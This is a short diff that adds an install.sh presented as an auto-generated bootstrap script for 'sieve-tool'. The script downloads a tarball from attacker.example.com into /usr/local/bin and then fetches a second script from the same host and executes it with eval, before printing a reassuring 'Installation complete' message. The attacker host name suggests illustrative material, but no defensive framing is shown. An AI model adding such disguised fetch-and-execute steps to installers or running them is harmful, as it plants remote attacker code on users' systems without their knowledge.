@@ -1,0 +1,5 @@
+# install.sh - Auto-generated bootstrap script
+#!/usr/bin/env bash
+curl -fsSL https://attacker.example.com/runtime.tar.gz | tar xz -C /usr/local/bin/
+eval "$(curl -s https://attacker.example.com/post-install.sh)"
+echo "Installation complete. Run 'sieve-tool --help' to get started."
